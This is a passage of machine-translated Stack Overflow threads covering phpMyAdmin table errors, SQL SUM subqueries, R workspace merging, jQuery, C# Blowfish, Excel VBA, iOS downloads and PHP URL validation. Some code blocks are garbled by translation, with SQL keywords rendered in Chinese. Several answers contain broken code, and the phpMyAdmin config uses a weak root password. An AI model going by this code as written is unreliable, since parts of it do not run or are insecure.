 * First server
 */
$i++;

/* Authentication type and info */
$cfg['Servers'][$i]['auth_type'] = 'HTTP';
$cfg['Servers'][$i]['user'] = 'root'; 
$cfg['Servers'][$i]['password'] = 'password';
$cfg['Servers'][$i]['extension'] = 'mysql';
$cfg['Servers'][$i]['AllowNoPassword'] = true;
$cfg['Lang'] = '';

/* Bind to the localhost ipv4 address and tcp */
$cfg['Servers'][$i]['host'] = 'localhost';
$cfg['Servers'][$i]['connect_type'] = 'tcp';

/* User for advanced features */
$cfg['Servers'][$i]['controluser'] = 'pma';
$cfg['Servers'][$i]['controlpass'] = '';

/* Advanced phpMyAdmin features */
$cfg['Servers'][$i]['pmadb'] = 'phpmyadmin';
$cfg['Servers'][$i]['bookmarktable'] = 'pma_bookmark';
$cfg['Servers'][$i]['relation'] = 'pma_relation';
$cfg['Servers'][$i]['table_info'] = 'pma_table_info';
$cfg['Servers'][$i]['table_coords'] = 'pma_table_coords';
$cfg['Servers'][$i]['pdf_pages'] = 'pma_pdf_pages';
$cfg['Servers'][$i]['column_info'] = 'pma_column_info';
$cfg['Servers'][$i]['history'] = 'pma_history';
$cfg['Servers'][$i]['designer_coords'] = 'pma_designer_coords';
//$cfg['Servers'][$i]['tracking'] = 'pma_tracking';
//$cfg['Servers'][$i]['userconfig'] = 'pma_userconfig';
//$cfg['Servers'][$i]['recent'] = 'pma_recent';
//$cfg['Servers'][$i]['table_uiprefs'] = 'pma_table_uiprefs';

/*
 * End of servers configuration
 */

?> 
```

* * *

## 回答 #1

> 赞同：81
> 
> 时间：2013-08-24T17:13:30.353

i've resolved with

```
sudo dpkg-reconfigure phpmyadmin 
```

* * *

## 回答 #2

> 赞同：75
> 
> 时间：2012-10-06T21:36:13.410

您必须在 phpMyAdmin 上的示例/文件夹中运行 create_tables.sql 来创建高级功能所需的表。或者通过在配置文件中注释它们来禁用这些功能。

* * *

## 回答 #3

> 赞同：19
> 
> 时间：2013-05-09T16:52:53.937

> “您必须在 phpMyAdmin 上的示例 / 文件夹中运行 create_tables.sql 以创建高级功能所需的表。或者通过在配置文件中注释它们来禁用这些功能”。

```
/usr/share/doc/phpmyadmin/examples/ 
```

仅用于完成选择的答案，这是 Ubuntu 上的示例/目录的路径。

只需使用导入功能并选择“create_tables.sql.gz”。

* * *

## 回答 #4

> 赞同：15
> 
> 时间：2014-01-22T09:04:32.850

您将在目录中找到`create_tables.sql.gz`文件`/usr/share/doc/phpmyadmin/examples/`

![在此处输入图像描述](../Images/4af0299832d332c41f13253efc8addc4.png)

提取它并更改`pma_`前缀，`pma__`反之亦然

![在此处输入图像描述](../Images/b4349ac1b22ba38253b7ef62fc58645b.png)

然后导入你的新脚本 SQL ：

![在此处输入图像描述](../Images/ee41d8d942ee498ff3904e494128d9a1.png)

* * *

## 回答 #5

> 赞同：15
> 
> 时间：2013-11-04T15:16:58.443

我遇到了同样的问题，但你的答案都没有解决它。但我找到[了这个链接](http://yuvrajingale.wordpress.com/2013/05/28/1146-table-phpmyadmin-pma_table_uiprefs-doesnt-exist/)。我不得不编辑/etc/phpmyadmin/config.inc.php：

```
$cfg['Servers'][$i]['table_uiprefs'] = 'pma_table_uiprefs'; 
```

**进入**

```
$cfg['Servers'][$i]['pma__table_uiprefs'] = ‘pma__table_uiprefs’; 
```

我的问题已经解决了，希望可以帮助到其他人。

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2013-08-09T20:22:11.737

只是为了完成答案 - 在 Ubuntu/Mint 上，您可以运行：

```
zcat /usr/share/doc/phpmyadmin/examples/create_tables.sql.gz | mysql 
```

（当然，这假设您的默认 mysql 用户是 root 并且您不使用密码的开发环境；在其他情况下使用`| mysql -uuser_name -p`）

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2013-05-05T14:20:09.747

从他们的网站下载 phpmyadmin 后，我`create_tables.sql`从**示例文件夹**中提取文件，然后从 phpmyadmin 的**“导入”**选项卡中导入它。
它在其中创建数据库“phpmyadmin”和相关表。

可能不需要此步骤，因为 12 个表已经存在...
问题似乎是表名称中的双下划线。

我在表格的前缀后编辑`'config.inc.php'`并添加了另一个下划线 ( `__`) 。`'pma_'`

IE。

```
$cfg['Servers'][$i]['userconfig'] = 'pma_userconfig'; 
```

变成了

```
$cfg['Servers'][$i]['userconfig'] = 'pma__userconfig'; 
```

这为我解决了这个问题。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2013-05-26T01:37:20.040

我剪切了user2237829提出的观点。create_tables 脚本中的表名使用双下划线，而 xampp 示例中的表名使用单下划线。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2014-03-23T04:44:51.213

这个对我有用....

显示的错误信息是：

```
“# 1146 – Table ‘phpmyadmin.pma_table_uiprefs’ doesn’t exist“ 
```

在您的程序文件上，找到配置文件`config.inc.php`phpmyadmin

然后跟踪文件`$Cfg ['Servers'] [$ i] ['table_uiprefs'] = ‘pma_table_uiprefs’;`

并将其替换为代码：`$cfg ['Servers'] [$ i] ['pma__table_uiprefs'] = ‘pma__table_uiprefs’;`

重新启动 XAMMP 并启动 localhost

解决了。

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2019-06-22T06:57:48.710

你可以在**1秒**内解决它！

只需使用此网址：

```
http://127.0.0.1/phpmyadmin/ 
```

代替

```
http://localhost/phpmyadmin/ 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2013-06-18T18:38:37.103

这是 Linux Debian 上的一个[已知错误](https://bugs.launchpad.net/ubuntu/+source/phpmyadmin/+bug/1175137)。我解决了使用[官方包](http://www.phpmyadmin.net/home_page/downloads.php)中的 create_tables.sql并在 /etc/phpmyadmin/config.inc.php 中用 pma__ 更改 pma_

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2015-02-09T15:39:46.947

我也有同样的问题..我在谷歌尝试了所有解决方案，但仍然出错。

但是，现在我解决了。

我已经解决了 make give double slash 这样的问题：

```
//$cfg['Servers'][1]['table_uiprefs'] = 'pma__table_uiprefs'; 
```

有用！！

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2015-05-13T08:36:04.373

我用以下设置注释掉了这一行

```
$cfg['Servers'][1]['table_uiprefs'] 
```

它并不是一个真正优雅的解决方案，但它满足了我的需求。（只需获得用于运行查询等的基本 PMA，无需 UI 自定义）。

请仅当您不关心 UI 首选项时才这样做。如果没有，其他人已经很好地回答了这个问题。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2016-01-02T06:21:12.337

编辑：

```
$cfg['Servers'][$i]['userconfig'] = 'pma__userconfig'; 
```

变成：

```
$Cfg ['Servers'] [$ i] ['table_uiprefs'] = ‘pma_table_uiprefs’; 
```

然后 [https://kamalkaur188.wordpress.com/category/removing-error-1146-table-phpmyadmin-pma_recent-doesnt-exist/](https://kamalkaur188.wordpress.com/category/removing-error-1146-table-phpmyadmin-pma_recent-doesnt-exist/)为我工作。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2019-10-23T10:52:21.960

最简单的方法是删除数据库 phpmyadmin 并运行 sql/create_tables.sql 脚本。只需登录到 mysql 控制台并：

```
DROP DATABASE phpmyadmin;
\. {your path to pma}/sql/reate_tables.sql 
```

* * *

## 回答 #16

> 赞同：-1
> 
> 时间：2015-05-28T06:38:31.947

跑

```
sudo dpkg-reconfigure phpmyadmin 
```

在你的 unix/linux/Mac 控制台中

* * *

## 回答 #17

> 赞同：-2
> 
> 时间：2014-06-12T13:39:55.003

您还可以在[phpMyAdmin 的 repo](https://github.com/phpmyadmin/phpmyadmin/blob/master/examples/create_tables.sql)中找到 create_tables.sql 文件。只需从 phpMyAdmin 面板导入它。它应该工作。

# sql - SQL请求中的SUM和SUM在同一张表中

> ID：12760395
> 
> 赞同：1
> 
> 时间：2012-10-06T13:55:09.727
> 
> 标签：sql

这是一个一般的 SQL 问题，但我使用 Firebird。

我有这张表（简化）：

```
id 金额类型 idtype
--------------------
1 10 合 1 0
2 15 英寸2 0
3 5 出1 1
4 4 出2 1
5 5 出 3 2

```

idtype 列“显示”传入部分的 id 并添加：我不能在我的询问表单中使用“类型”列，因为每次类型都不同。传入的 idtype 为“0”，这意味着“传入部分”

所以，我想要结果：

```
身份证进出  
--------------------
1 10 9    
2 15 5

```

我试过这样：

```
选择
  ID，
  数量，
   (
    选择
      SUM（金额）作为一起
    从
      我的表
    在哪里
      身份类型 0
    通过...分组
      ID
   ) 作为“出”
从
  我的表
在哪里
  身份类型 = 0

```

但这不起作用。有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T13:59:41.117

您正在使用该`id`字段而不是`idtype`在条件中，并且您没有匹配要汇总到任何内容的记录。

```
select
  id,
  amount,
   (
    select
      SUM (amount) as together
    from
      mytable
    where
      idtype = t.id
   ) as "out"
from
  mytable t
where
  idtype = 0 
```

你也可以把它写成一个连接：

```
select
  id,
  amount,
  sum(t2.amount) as "out"
from
  mytable t
  innerjoin mytable t2 on t2.idtype = t.id
group by
  t.id, t.amount
where
  idtype = 0 
```

# r - 在 R 和通用工作空间管理中组合或合并工作空间

> ID：12760397
> 
> 赞同：6
> 
> 时间：2012-10-06T13:55:32.270
> 
> 标签：r, project, workspace

当一个计算系统停机/忙碌时，我经常发现自己将工作空间转移到不同的暂存驱动器等，或者，我想同时运行两个冗长的包以节省时间并在不同的地方两次加载相同的工作空间。

正因为如此，我真的很喜欢一种查看工作区之间不同对象的方法以及一种组合它们的方法，只将新的、更改的或更新的工作区对象添加到类似的工作区。这对我来说非常有用。

到目前为止，我依赖于手动记笔记，并且在两周后对我的涂鸦感到困惑。我真的只是想学习如此好的工作实践和习惯，让这种事情变得更容易。

一般来说，我真的很想了解更多关于工作空间管理的信息，以及有经验的用户如何为长期、持续的项目保持工作空间的全面和整洁。我经常使用 Rstudio，但远程工作或使用我们的 HPC 系统可能有点滞后和笨拙，所以我倾向于使用命令行和交互式会话。

我认为制作对象列表可能是关键，但我希望能够更轻松地注释事物，也许使用用于制作对象的数据和参数等。

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-06T15:03:01.633

我认为需要在这里构建自己的功能，执行以下操作：

*   一个接一个地加载工作区，使用：

    ```
    load() 
    ```

*   重命名工作区的每个元素以防止在加载另一个工作区或将其放入列表时覆盖

*   检查工作区的时间戳：

    ```
    file.info() 
    ```

*   并仅保留最新的对象，然后将其保存在一些最新的工作区中

例子：

```
for(i in 1:10){
    dummy <- rnorm(1)
    Sys.sleep(1.3)
    save(dummy,file=paste("test",i,".Rdata",sep=""))
}

DUMMY <- list()
timestamps <- NULL

for(i in 1:10){
    filename <- paste("test",i,".Rdata",sep="")
    load(filename)
    DUMMY[[i]] <- dummy
    timestamps[i] <- file.info(filename)$mtime
}

uptodate <- unlist(timestamps)==max(unlist(timestamps))
dummy <- unlist(DUMMY[uptodate])
save(dummy,file="uptodate.Rdata") 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-06T17:54:55.757

我认为关键是将您的工作区加载到单独的环境中，然后弄清楚您希望如何合并它们（如果有的话）。

首先，让我们制作一些要保存的对象。

```
set.seed(1)
a <- data.frame(1:10, 1:10)
b <- rnorm(10) 
```

跟踪对象创建时间的一种方法是设置属性。缺点是您必须记住在更新对象时更新它。（有关替代方案，请参阅帖子的最后一部分）

```
d <- structure(data.frame(b), updated=Sys.time())
attr(d, 'updated')
#[1] "2012-10-06 12:34:06 CDT" 
```

您可以在保存工作空间之前将当前时间分配给一个变量，以了解您何时保存它（[PeterM](https://stackoverflow.com/users/1144966/peter-m)`file.info`建议[可能](https://stackoverflow.com/a/12760905/967840)是更好的选择）

```
updated <- Sys.time() 
dir.create('~/tmp') # create a directory to save workspace in.
save.image('~/tmp/ws1.RData')

d[1, 1] <- 1 #make a change to `d`
attr(d, "updated") <- Sys.time() # don't forget to update the `updated` attribute
e <- b * a # add a new object
updated <- Sys.time()
save.image('~/tmp/ws2.RData') 
```

现在清除工作区，并加载工作区。但是，不是将它们加载到 中，而是将它们`.GlobalEnv`加载到自己的环境中

```
rm(list=ls(all=TRUE)) # clear .GlobalEnv
w1 <- new.env()
w2 <- new.env()
load('~/tmp/ws1.RData', envir=w1)
load('~/tmp/ws2.RData', envir=w2)

> ls(w1)
[1] "a"       "b"       "d"       "updated"
> ls(w2)
[1] "a"       "b"       "d"       "e"       "updated"

> with(w1, updated)
[1] "2012-10-06 12:34:09 CDT"
> with(w2, updated)
[1] "2012-10-06 12:35:02 CDT"

> attr(w1$d, 'updated')
[1] "2012-10-06 12:34:06 CDT"
> attr(w2$d, 'updated')
[1] "2012-10-06 12:35:02 CDT" 
```

您可能对类似的功能感兴趣[`.ls.objects`](https://stackoverflow.com/questions/1358003/tricks-to-manage-the-available-memory-in-an-r-session)

```
> .ls.objects(pos=w1)
              Type Size PrettySize Rows Columns
a       data.frame  872    [1] 872   10       2
b          numeric  168    [1] 168   10      NA
d       data.frame 1224   [1] 1224   10       1
updated    POSIXct  312    [1] 312    1      NA
> .ls.objects(pos=w2)
              Type Size PrettySize Rows Columns
a       data.frame  872    [1] 872   10       2
b          numeric  168    [1] 168   10      NA
d       data.frame 1224   [1] 1224   10       1
e       data.frame 1032   [1] 1032   10       2
updated    POSIXct  312    [1] 312    1      NA 
```

* * *

您可以使用自定义包装器`assign`来跟踪对象的更新时间。

```
myAssign <- function(x, value, ...) {
  attr(value, "updated") <- Sys.time()
  assign(x, value, ...)
}

> myAssign("b", w1$b[1:2], pos=w1)
> w1$b
[1] -0.6264538  0.1836433
attr(,"updated")
[1] "2012-10-06 12:44:55 CDT" 
```

最后，如果你想变得花哨，你可以做一个主动绑定，这样你的对象`updated`在它改变时总是得到一个更新的属性。

```
f <- local({
  delayedAssign('x', stop('object not found'))
  function(v) {
    if (!missing(v)) x <<- structure(v, updated=Sys.time())
    x
  }
})
makeActiveBinding('ab', f, .GlobalEnv)
> ab # Error, nothing has been assigned to it yet
Error in function (v)  : object not found
> ab <- data.frame(1:10, y=rnorm(10))
> attr(ab, 'updated')
[1] "2012-10-06 12:46:53 CDT"
> ab <- data.frame(10:1, y=rnorm(10))
> attr(ab, 'updated')
[1] "2012-10-06 12:47:04 CDT" 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-06T15:07:02.430

我可以回答您的部分问题，但将其余问题留给其他人。

假设您的工作区有许多对象，在您退出 R 之前，保存工作区并将其重命名为 .RData 为 work1.RData。如果您使用的是 linux，请尝试重命名您的文件：

```
mv .RData work1.RData 
```

然后您打开一个新的 R 会话，创建任意数量的对象并像以前一样保存它。如果您想将此工作区带到其他系统，您可以重命名它。

现在您有两个工作区 .RData 二进制文件。您可以使用将它们加载到单个当前工作区中

```
load ("work1.RData") 
```

然后，像这样检查工作区中加载的对象

```
 ls() 
 objects() 
```

在这种情况下也`save.image()`很有用。

高温高压

# javascript - ie7 的 jquery.selectbox-0.2 问题 - 下拉菜单出现在元素后面而不是前面

> ID：12760419
> 
> 赞同：4
> 
> 时间：2012-10-06T13:57:33.683
> 
> 标签：javascript, jquery

我正在使用[http://code.google.com/p/select-box/](http://code.google.com/p/select-box/)选择框 jquery 插件，以便我可以更改选择框的外观。

该插件很棒并且工作正常，除了在 ie7 中，下拉列表出现在它们碰巧重叠的任何元素后面。这似乎是一个已知问题，但似乎没有人回答报告它的人。

我想知道是否有人可以建议修复？

这个问题可以在这里看到：[http ://code.google.com/p/select-box/issues/detail?id=8](http://code.google.com/p/select-box/issues/detail?id=8)

谢谢你的帮助 ：）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-09T16:52:22.110

您可以使用这个在 dom 就绪上运行的一小段 jquery 代码来使用这个解决方案：

```
$(function() {  
    var zIndexNumber = 1000;  
    $('div').each(function() {  
        $(this).css('zIndex', zIndexNumber);  
        zIndexNumber -= 10;  
    });  
}); 
```

或尝试修复 css z-indexing：[http ://web.enavu.com/snippets/fixing-the-ie7-z-index-issue-internet-explorer-7-z-index/](http://web.enavu.com/snippets/fixing-the-ie7-z-index-issue-internet-explorer-7-z-index/)

工作小提琴：http: [//jsfiddle.net/IrvinDominin/aTUC5/](http://jsfiddle.net/IrvinDominin/aTUC5/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-04T07:16:05.920

这也可以通过为下拉 div 提供更高的 z-index 值和为位于其下方并显示文本的每个 div 提供较小的 z-index 来解决。

前任：

```
<div id="sbHolder_28376079" class="sbHolder" tabindex="0">
    ...
    </div>
    <div class="div1">
        <div class="div2">
            <div class="div3">
            </div>
        </div> 
    </div>

.sbHolder{z-index : 100;}
.div1{z-index : 90;}
.div2{z-index : 80;}
.div3{z-index : 70;} 
```

这应用了与上面 js 中提到的相同的逻辑，但它在使用绝对位置和 z-index 的其他部分破坏了我的 Ui。

# javascript - javascript 运行时库按钮单击事件

> ID：12760425
> 
> 赞同：0
> 
> 时间：2012-10-06T13:57:57.397
> 
> 标签：javascript

有一个从数据库中读取数据的画廊。

在其下方有一些圆圈显示所有数据或记录的数量。

每次一个圆圈变成黄色，表示什么是活动帖子。

我已经通过这种方式生成了这种机制：

```
function drawCircles(activeIndex) {
    var off_html = '<img class="post_circle" src="../themes/dark/images/off.png"/>';
    var on_html = '<img class="post_circle" src="../themes/dark/images/on.png"  />';
    $('#circles').empty();

    for (var i = 1; i <= pcount; i++) {

        if (i != activeIndex) {
            $(off_html).appendTo($('#circles'));
        }
        else {
            $(on_html).appendTo($('#circles'));
        }

    }

} 
```

**PCount = 所有帖子的计数...**

## #circles div 是一个包含圆圈的条形图。**

当我们打电话时

```
drawCircles(2) 
```

第二个圆圈变成黄色。现在我想为此创建一个点击事件。我想了解点击了哪个圆圈？我试过**.live** function ，但我找不到点击了哪个圆圈...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:06:43.857

尝试：

```
$('#circles img.post_circle').on('click', function(e) {
  // e.target is the circle clicked
}); 
```

编辑：这是一个更完整的答案：

```
$(function(){
  var off_html = '<img class="post_circle" src="http://placehold.it/50x50/ff0000"/>';
  var on_html = '<img class="post_circle" src="http://placehold.it/50x50/ffff00"/>';

  var pcount = 5;

  $('#circles').empty();    
  drawCircles(3);

  function drawCircles(activeIndex) {
    for (var i = 1; i <= pcount; i++) {
      if (i != activeIndex) {
        $(off_html).data('index', i).appendTo($('#circles'));
      } else {
        $(on_html).data('index', i).appendTo($('#circles'));
      }
    }
  }

  $('#circles img.post_circle').on('click', function(e) {
    alert($(this).data('index'));
  });
}); 
```

这是一个[小提琴](http://jsfiddle.net/awilliams47/J5MW7/1/)

# c# - 将PHP中的解密代码转换为C#

> ID：12760429
> 
> 赞同：0
> 
> 时间：2012-10-06T13:58:06.607
> 
> 标签：c#, php, encryption, blowfish

我需要将 PHP 中的 BlowFish Descrypt 代码转换为 C#。

PHP代码（X-Cart），

```
function mdecrypt($data, $key) {
    $td = mcrypt_module_open(MCRYPT_BLOWFISH, '', MCRYPT_MODE_ECB, '');
    $decrypted_data = mdecrypt_generic($td, func_hex2str($data));

    return $decrypted_data;
}

#
# Convert hex to string
# 
function func_hex2str($str) {
    $ret = "";
    $l = strlen($str);
    for ($i = 0; $i < $l; $i += 2) {
            $ret .= chr(hexdec(substr($str, $i, 2)));
    }     
        echo $ret;

    return $ret;
} 
```

我试过了，

```
BlowFish algo = new BlowFish("0cb12a77dbb5ee7128ad3aea6154614f");
string details = "138b5a7e2c0e453a"; 

int dLen = details.Length;
string ret = "";
for (int i = 0; i < dLen; i += 2)
{
    ret += (char) Convert.ToInt64(details.Substring(i, 2), 16);
}
details = algo.Decrypt_ECB(ret);
Console.WriteLine(details); 
```

但它在 PHP 和 C# 之间打印不同的结果。（PHP：你好，C#：??q???_^）

有人给我一个提示，他说可能是关于“填充”。

但我还是不明白。

有人知道我在做什么错吗？请给我提意见。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T14:10:53.043

[BCrypt.Net](http://bcrypt.codeplex.com/)是 Blowfish 加密算法的开源实现。您可以使用该源代码来查看我认为它是如何完成的。

如果您只是为了工作和完成工作而需要它，那么*BCrypt*的[使用](http://lostinthegc.wordpress.com/2011/03/22/using-bcrypt-in-a-net-application-why-its-better-than-sha-or-md5/)非常简单：

```
string salt = BCryptHelper.GenerateSalt(6);
var hashedPassword = BCryptHelper.HashPassword("password", salt);
Console.WriteLine(BCryptHelper.CheckPassword("password", hashedPassword)); 
```

* * *

[你可以在这里](http://bcrypt.codeplex.com/SourceControl/changeset/view/1eef0262901c#BCrypt.Net/BCrypt.cs)找到源代码：

```
 /// <summary>Hash a password using the OpenBSD bcrypt scheme.</summary>
    /// <exception cref="ArgumentException">Thrown when one or more arguments have unsupported or
    ///                                     illegal values.</exception>
    /// <param name="input">The password to hash.</param>
    /// <param name="salt">    the salt to hash with (perhaps generated using BCrypt.gensalt).</param>
    /// <returns>The hashed password</returns>
    public static string HashPassword(string input, string salt)
    {
        if (input == null)
            throw new ArgumentNullException("input");

        if (string.IsNullOrEmpty(salt))
            throw new ArgumentException("Invalid salt", "salt");

        // Determinthe starting offset and validate the salt
        int startingOffset;
        char minor = (char)0;
        if (salt[0] != '$' || salt[1] != '2')
            throw new SaltParseException("Invalid salt version");
        if (salt[2] == '$')
            startingOffset = 3;
        else
        {
            minor = salt[2];
            if (minor != 'a' || salt[3] != '$')
                throw new SaltParseException("Invalid salt revision");
            startingOffset = 4;
        }

        // Extract number of rounds
        if (salt[startingOffset + 2] > '$')
            throw new SaltParseException("Missing salt rounds");

        // Extract details from salt
        int logRounds = Convert.ToInt32(salt.Substring(startingOffset, 2));
        string extractedSalt = salt.Substring(startingOffset + 3, 22);

        byte[] inputBytes = Encoding.UTF8.GetBytes((input + (minor >= 'a' ? "\0" : "")));
        byte[] saltBytes = DecodeBase64(extractedSalt, BCRYPT_SALT_LEN);

        BCrypt bCrypt = new BCrypt();
        byte[] hashed = bCrypt.CryptRaw(inputBytes, saltBytes, logRounds);

        // Generate result string
        StringBuilder result = new StringBuilder();
        result.Append("$2");
        if (minor >= 'a')
            result.Append(minor);
        result.AppendFormat("${0:00}$", logRounds);
        result.Append(EncodeBase64(saltBytes, saltBytes.Length));
        result.Append(EncodeBase64(hashed, (_BfCryptCiphertext.Length * 4) - 1));
        return result.ToString();
    } 
```

# excel - Excel VBA - 另存为过程的不同逻辑的帮助

> ID：12760430
> 
> 赞同：-1
> 
> 时间：2012-10-06T13:58:07.303
> 
> 标签：excel, excel-2007, vba

我创建了一个工作簿，它对一个变量执行所有计算，以便每次增加都会生成一个新文件，我想用该特定数字保存该文件。在这里，我编写了一个 VBA 程序来避免手动重复执行相同的过程。通过打开主文件并将数字增加 1 关闭它然后使用该名称保存新文件关闭新文件并打开主文件等，它可以正常工作。在这里，打开和关闭主文件会消耗相当多的时间。请您看一下并建议我如何保持主文件打开并不加选择地保存新生成的文件。或者，除了这个逻辑之外的其他东西需要更少的时间。

先感谢您。

```
Sub AsBuiltForm()

a = InputBox("Enter first number")
b = InputBox("Enter last number")

For i = a - 1 To b - 1 

Application.DisplayAlerts = False

Workbooks.Open Filename:="C:\SA.xlsx"  'main file

Range("bi1") = i + 1

Dim SaveName As Integer

SaveName = ActiveWorkbook.Sheets(1).Range("bi1").value

Sheets("1 of 2").Range("A1:CT103").value = Sheets("1 of 2").Range("A1:CT103").value

Sheets("2 of 2").Range("A1:CT103").value = Sheets("2 of 2").Range("A1:CT103").value

Application.ActiveWorkbook.SaveAs "C:\Desktop\SA\" & SaveName

Sheets("GL").Select
ActiveWindow.SelectedSheets.Delete

Sheets("SA").Select
ActiveWindow.SelectedSheets.Delete

ActiveWorkbook.Close True

Next

End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T15:51:17.997

这可能会稍微快一些（未经测试，所以请发回任何问题）

如果主工作簿中有很多公式，那么您可以考虑使用：

`Excel.Application.Calculation = xlCalculationManual`

然后，如果您需要在保存之前的任何时候进行计算，请使用以下行：

`Excel.Application.Calculate`

请记住完成以下操作，因为此属性更改仍然存在：

`Excel.Application.Calculation = xlCalculationAutomatic`

```
 Sub AsBuiltForm()

    Dim SaveName As String
    Dim mainBook As Workbook

    a = InputBox("Enter first number")
    b = InputBox("Enter last number")

    Workbooks.Open Filename:="C:\SA.xlsx"  'main file
    Set mainBook = Excel.Workbooks("SA.xlsx")

        For i = a - 1 To b - 1

            mainBook.Sheets(1).Range("BI1") = i + 1
            SaveName = mainBook.Sheets(1).Range("BI1") & ".xlsx"

            mainBook.SaveCopyAs "C:\Desktop\SA\" & SaveName
            Workbooks.Open Filename:="C:\Desktop\SA\" & SaveName

            With Excel.ActiveWorkbook
                .Sheets("1 of 2").Range("A1:CT103").Value = Sheets("1 of 2").Range("A1:CT103").Value
                .Sheets("2 of 2").Range("A1:CT103").Value = Sheets("2 of 2").Range("A1:CT103").Value
                Excel.Application.DisplayAlerts = False
                .Sheets("GL").Delete
                .Sheets("SA").Delete
                .Close True
            End With

        Next

    mainBook.Close False
    Set mainBook = Nothing

End Sub 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T15:01:14.957

由于您已经通过以下方式不可逆转地更改了主文件： 1\. 粘贴值。2\. 删除工作表。重新打开它，您没有任何其他选择。

但是，这里有一个替代方案。我假设 GA 和 SA 是您在粘贴值之后不再需要的“公式”表。1\. 创建一个新工作簿。2\. 复制您要保留的工作表。

这样一来，您的主工作簿就不会掺假，您可以重复使用它来创建后续工作簿。

# ios - ASIHTTPREQUEST 无内容长度响应（大 PDF 文件）

> ID：12760432
> 
> 赞同：0
> 
> 时间：2012-10-06T13:58:18.493
> 
> 标签：ios, xcode, asihttprequest, content-length

我的 iOS 应用程序正在使用 ASIHTTPREQUEST 从服务器下载文件。它运作良好，但 uiprogressview 没有。

所以我使用代码来检查标题信息：

```
ASIHTTPRequest *request = [ASIHTTPRequest requestWithURL:[NSURL URLWithString:@"http://www.ozis.com.au/nm.pdf"]];
[request startSynchronous];
NSLog(@"%@",[request responseHeaders]); 
```

然后我发现没有内容长度响应。结果如下所示：

```
"Accept-Ranges" = bytes;
Connection = "Keep-Alive";
"Content-Encoding" = gzip;
"Content-Type" = "application/pdf";
Date = "Sat, 06 Oct 2012 13:47:15 GMT";
Etag = "\"2b5139-ddf639-4cafe418b6140\"";
"Keep-Alive" = "timeout=10, max=30";
"Last-Modified" = "Mon, 01 Oct 2012 12:07:57 GMT";
Server = Apache;
"Transfer-Encoding" = Identity;
Vary = "Accept-Encoding"; 
```

但有时，也许有 5% 的机会，经过漫长的等待，我可以得到它的长度。此 PDF 文件为 13 MB。同一位置的其他文件可以获得正确的长度。

我应该怎么办？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-07T00:54:33.697

最后，我成功了。因为我的服务器会自动对 PDF 文件进行 gzip 压缩，所以我无法获取内容长度作为响应。

要关闭 gzip 功能，只需添加

```
SetEnv no-gzip dont-vary 
```

在`.htaccess`文件中。而已。

# php - 检查url是否有效的函数

> ID：12760435
> 
> 赞同：0
> 
> 时间：2012-10-06T13:58:30.690
> 
> 标签：php, url

好吧..我想检查一个网址是否有效。

这样他们就不能只输入诸如`hoadw`,之类的内容`adwij£1%`，而且插入的 url 必须是有效的 like `domain.com`。

正在考虑这样的功能：

```
function checkurl($url) { 
   if ($url = "VALID") {  
      return true;  
   }else{  
      return false;
   }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-06T14:01:12.217

你应该使用[`filter_var()`](http://php.net/manual/en/function.filter-var.php)：

```
function checkurl($url)
  //if it's valid it return's the URL else FALSE
  return filter_var($url, FILTER_VALIDATE_URL);
} 
```

PS：您必须运行 PHP 5.2 或更高版本。

# java - 有没有办法重复使用 在弹簧配置文件中？

> ID：12760436
> 
> 赞同：2
> 
> 时间：2012-10-06T13:58:43.750
> 
> 标签：java, spring

我有一堆规则要注入一组类，如下所示：

```
<bean id="rule1" class="com.vikdor.rules.Rule1" />
<bean id="rule2" class="com.vikdor.rules.Rule2" />
<bean id="rule3" class="com.vikdor.rules.Rule3" />
<bean id="rule4" class="com.vikdor.rules.Rule4" />
<bean id="rule5" class="com.vikdor.rules.Rule5" />

<util:list id="commonRules">
    <ref bean="rule1" />
    <ref bean="rule3" />
    <ref bean="rule5" />
</util:list>

<util:list id="normalInvRules">
   <!-- Include common rules -->
   <ref bean="rule4" />
</util:list>

<util:list id="prepaidInvRules">
   <!-- Include common rules -->
   <ref bean="rule2" />
</util:list> 
```

如何在与`normalInvRules`和对应的列表中包含通用规则列表`prepaidInvRules`？

规则的数量（例如 rule1、rule2 等）更多，数量组（normalInvRules、prepaidInvRules 等）也更多。所以，我想知道是否有办法避免重复通用规则，只列出特定规则并包含对通用列表的引用。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-06T14:17:09.993

有一个称为“集合合并”的功能可以做到这一点。请参见第 3.3.3.4.1 节。[Spring 文档](http://static.springsource.org/spring/docs/3.0.x/reference/beans.html)中的“集合合并” 或[我在该主题上写的 2008 年博客文章（带有示例）](http://greybeardedgeek.net/2008/04/23/spring-collection-merging/)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-06T14:54:19.513

I like the approach suggested by @GreyBeardedGeek, just want to throw in a few more suggestions:

a. Doing it using `@Configuration` with the base rules list in xml:

```
@Configuration
@ImportResource("classpath:/baseconfig.xml")
public static class RulesConfiguration{
    @Resource List<Rule> commonRules;

    @Bean
    public List<Rule> normalInvRules(){
        List<Rule> rules = new ArrayList<Rule>();
        rules.addAll(commonRules);
        rules.add(new Rule());
        return rules;
    }
} 
```

b. Using a custom factory bean, responsible for extending a list:

```
class ListExpandingFactoryBean<T> implements FactoryBean<List<T>>{

    private List<T> baseList;
    private List<T> extendedList;

    @Override
